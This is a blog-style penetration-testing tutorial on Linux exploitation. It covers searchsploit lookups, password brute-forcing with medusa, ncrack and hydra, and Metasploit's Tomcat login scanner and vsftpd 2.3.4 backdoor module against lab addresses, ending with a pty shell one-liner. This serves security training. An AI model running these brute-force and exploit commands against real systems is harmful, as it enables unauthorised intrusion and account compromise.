---
layout: post
published: true
title: Linux Exploitation 9.1
tags:
  - PWP
  - Intermediate
  - Linux Exploitation
comments: true
---
## Approaches to Linux Expoitation


## Introduction 

**_In this blog post we will look for various approaches to exploit linux target and get remote access.**_


**After identifying vulnerabilities, now we will exploi them to access target remotely**

The basic approaches to exploit target network:


* What services's are running in target network?

* What's the version of running services?

* Are they exploitable to any public CVE?

* Any public exploit available to those services?

* Had we found any potential vulnerability in our previous phases?  

* Any sensitive infromation we found?

* Any credentials we found in previous phases?

* Any web app vulnerability to get system level access

* Is website also has admin panel/dashboard or any service are running, are exploitabe ?

_**There may be soo more approaches, depends on the skills of pentester**_


**Searchsploit**


Searchsploit is used to find exploits of any exploitable network servicec, web services on target network.

It Allows to search through exploits and shellcodes using one or more terms from Exploit-DB


**Installing Searchsploit**

```
# apt update && apt -y install exploitdb
```

After install you can easily use it

```
searchsploit linux kernel 3.2
```

Let's use it to find exploit for linux kernal

```
$ searchsploit linux kernel 4. | head
---------------------------------------------- ---------------------------------
 Exploit Title                                |  Path
---------------------------------------------- ---------------------------------
BSD/Linux Kernel 2.3 (BSD/OS 4.0 / FreeBSD 3. | bsd/dos/19423.c
HP-UX 11 / Linux Kernel 2.4 / Windows 2000/NT | multiple/dos/20997.c
Linux 4.18 - Arbitrary Kernel Read into dmesg | linux/dos/45405.txt
Linux Kernel (Debian 7.7/8.5/9.0 / Ubuntu 14. | linux_x86-64/local/42275.c
Linux Kernel (Debian 7/8/9/10 / Fedora 23/24/ | linux_x86/local/42274.c
Linux Kernel (Debian 9/10 / Ubuntu 14.04.5/16 | linux_x86/local/42276.c
Linux Kernel (PonyOS 4.0) - 'fluttershy' LD_L | linux/local/41875.py
```

Suppose target is running apache 5.3, let's check available exploit for this service

```
$ searchsploit apache 5.3| head
---------------------------------------------- ---------------------------------
 Exploit Title                                |  Path
---------------------------------------------- ---------------------------------
Apache + PHP < 5.3.12 / < 5.4.2 - cgi-bin Rem | php/remote/29290.c
Apache + PHP < 5.3.12 / < 5.4.2 - cgi-bin Rem | php/remote/29290.c
Apache + PHP < 5.3.12 / < 5.4.2 - Remote Code | php/remote/29316.py
Apache ActiveMQ 5.2/5.3 - Source Code Informa | multiple/remote/33868.txt
Apache ActiveMQ 5.3 - 'admin/queueBrowse' Cro | multiple/remote/33905.txt
Apache Tomcat < 5.5.17 - Remote Directory Lis | multiple/remote/2061.txt
Apache Tomcat < 6.0.18 - 'utf8' Directory Tra | multiple/remote/6229.txt
```

To find the url for exploit, simply use -w.

```
$searchsploit -w apache 5.3| head
----------------------------------- --------------------------------------------
 Exploit Title                     |  URL
----------------------------------- --------------------------------------------
Apache + PHP < 5.3.12 / < 5.4.2 -  | https://www.exploit-db.com/exploits/29290
Apache + PHP < 5.3.12 / < 5.4.2 -  | https://www.exploit-db.com/exploits/29290
Apache + PHP < 5.3.12 / < 5.4.2 -  | https://www.exploit-db.com/exploits/29316
Apache ActiveMQ 5.2/5.3 - Source C | https://www.exploit-db.com/exploits/33868
Apache ActiveMQ 5.3 - 'admin/queue | https://www.exploit-db.com/exploits/33905
Apache Tomcat < 5.5.17 - Remote Di | https://www.exploit-db.com/exploits/2061
Apache Tomcat < 6.0.18 - 'utf8' Di | https://www.exploit-db.com/exploits/14489
```

**Like this you can easily find exploits to a particular vulnerabilty, and these exploits are also available with POC's that helps
you step by step to execute exploits against target**


**Exploiting Lower Hanging Fruits**

Lower Hanging Fruits(LHF) exploitation is the process to leaverage your previous phases findings to exploit target system.

This approach is also save's time and efforts of pentesters.

Lower hanging fruits, Means:

* Misconfigured servers

* Unimplemented or badly implemented ACL’s

* Default or weak passwords (easily guessable)

* Open SMB shares / Null sessions

* Broadcast Requests

* Vulnerabilities related to public exploits

* Etc.


We have learnt some of them previously if you remember, this is right time to recall them.


**Using Medusa to Exploit LHF**

Medusa is intended to be a speedy, massively parallel,  modular,  login brute-forcer.   The goal is to support as many services which allow remote authentication as possible.


Read medusa manual 

```
$ man medusa
```
To see usage of medusa

```
$ medusa -h
```

To list available modules of medusa

```
$ medusa -d
```
You can see there are many modules, but if you want know about a specific module

```
$ medusa -M ftp -q
```
It will tell you all about ftp modules

To exploit target using medusa first we need to have wordlist which we can generate using cewl/cupp tools, or we can manually guess namining convention from target services, run web applications.

Basic usage of medusa

```
$ medusa -h <targetIp> -M ftp -U usernames.txt -P passwords.txt
```

**Ncrack**

Ncrack is designed for companies and security professionals to audit large networks for default or weak passwords in a rapid and reliable way. It can also be used to conduct fairly sophisticated and intensive brute force attacks against individual services.

Ncrack also has its wordlists available, to check:

```
$ ls -l /usr/share/ncrack/
total 904
-rw-r--r-- 1 root root   5754 Aug 28  2019 common.usr
-rw-r--r-- 1 root root  47070 Aug 28  2019 default.pwd
-rw-r--r-- 1 root root   3451 Aug 28  2019 default.usr
-rw-r--r-- 1 root root  22414 Aug 28  2019 jtr.pwd
-rw-r--r-- 1 root root    266 Aug 28  2019 minimal.usr
-rw-r--r-- 1 root root 356352 Aug 28  2019 myspace.pwd
-rw-r--r-- 1 root root    748 Aug 28  2019 ncrack-services
-rw-r--r-- 1 root root  58472 Aug 28  2019 phpbb.pwd
-rw-r--r-- 1 root root 410725 Aug 28  2019 top50000.pwd
```


```
ncrack -h
```

To specify a target

```
ncrack 10.10.10.180
```

```
ncrack me.hacker.com
```

Ncrack Supports FTP, Telnet, SSH, HTTP/HTTPS, POP3(S), SMB, RDP, VNC


USAGE:

```
ncrack <service_name>://target:<port_number>
```

Let's target ssh

```
ncrack ssh 10.10.10.135
```

we can also specify the port 

```
ncrack ssh ssh://10.10.10.135:187     // Suppose ssh is running on port 187
```

**Using hydra to exploit weak passwords**


hydra is a very fast network logon cracker which supports many different services

usage :

```
$ hydra -h
```

-L - List of usernames
-P - List of passwords


```
hydra -L users.txt -P passwords.txt ssh://10.10.10.135
```

## Exploitation

The process of taking adavantage of target vulnerabilties to get remote access in target system and leaverage access to perform malicious action in target system.


Having found vulnerabilities in target system now proceed to to exploit them.


Using Metasploit to exploit target vulnerability and get meterpreter shell.


**Using previous findings now we will exploit them in metasploit**


Suppose you found that target is running apache tomcat 5.5 server.

Search for exploit available on exploit-db

```
searchsploit -w  apache tomcat 5.5 
----------------------------------- --------------------------------------------
 Exploit Title                     |  URL
----------------------------------- --------------------------------------------
Apache Tomcat 5.5.0 < 5.5.29 / 6.0 | https://www.exploit-db.com/exploits/12343
Apache Tomcat 5.5.15 - cal2.jsp Cr | https://www.exploit-db.com/exploits/30563
Apache Tomcat 5.5.25 - Cross-Site  | https://www.exploit-db.com/exploits/29435
Apache Tomcat < 5.5.17 - Remote Di | https://www.exploit-db.com/exploits/2061
Apache Tomcat < 6.0.18 - 'utf8' Di | https://www.exploit-db.com/exploits/14489
Apache Tomcat < 6.0.18 - 'utf8' Di | https://www.exploit-db.com/exploits/6229
Apache Tomcat < 9.0.1 (Beta) / < 8 | https://www.exploit-db.com/exploits/42953
Apache Tomcat < 9.0.1 (Beta) / < 8 | https://www.exploit-db.com/exploits/42966
```


You have two choices you can directly download exploit from exploit db and execute to gain target unauthorized access.

Or use metasploit to do this task for you.

First start from password guessing as its a low hanging fruit.

```
# msfconsole
```


~~~
# search tomcat_mgr_login

Matching Modules
================

   #  Name                                     Disclosure Date  Rank    Check  Description
   -  ----                                     ---------------  ----    -----  -----------
   0  auxiliary/scanner/http/tomcat_mgr_login                   normal  No     Tomcat Application Manager Login Utility
~~~

```
msf5 > use auxiliary/scanner/http/tomcat_mgr_login
msf5 auxiliary(scanner/http/tomcat_mgr_login) > 
```
Using 'show option' command we can see required options to set.

```
msf5 auxiliary(scanner/http/tomcat_mgr_login) > set rhost 10.10.10.150
rhost => 10.10.10.150
msf5 auxiliary(scanner/http/tomcat_mgr_login) > set rport 8180
rport => 8180
msf5 auxiliary(scanner/http/tomcat_mgr_login) > set rport 8080
rport => 8080
msf5 auxiliary(scanner/http/tomcat_mgr_login) > set STOP_ON_SUCCESS true
STOP_ON_SUCCESS => true
msf5 auxiliary(scanner/http/tomcat_mgr_login) > set ssl true
[!] Changing the SSL option's value may require changing RPORT!
ssl => true
msf5 auxiliary(scanner/http/tomcat_mgr_login) > run
```

This will run and give us desired result.

After getting credentials you can login apache tomcat manager and will be able to perform malicious actions.

We can also use previos techniques.

**Exploit FTP v2.3.4 server using metasplolit**

~~~
> search vsftpd

Matching Modules
================

   #  Name                                  Disclosure Date  Rank       Check  Description
   -  ----                                  ---------------  ----       -----  -----------
   0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution
~~~
Use exploit

```
msf5 exploit(unix/ftp/vsftpd_234_backdoor) > show options

Module options (exploit/unix/ftp/vsftpd_234_backdoor):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT   21               yes       The target port (TCP)


Exploit target:

   Id  Name
   --  ----
   0   Automatic
```

Set options

```
msf5 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOST 10.10.10.158
RHOST => 10.10.10.158
```
Port is already set to 21.

Simple use run/exploit command

```
msf5 exploit(unix/ftp/vsftpd_234_backdoor) > exploit
```

And it will execute and if successful give you meterpreter shell

In condition to get proper target shell use 'shell' command in meterpreter.

And suppose if you dont have proper tty shell you can use python one liner to get TTY shell

```
python -c 'import pty; pty.spawn("/bin/sh")'
```




## Conclusion

**_In this blogpost we have learnt some basic approaches to exploit target, you can use some of these approaches in windows target also, like lower hanging fruit._**


























































































































 












































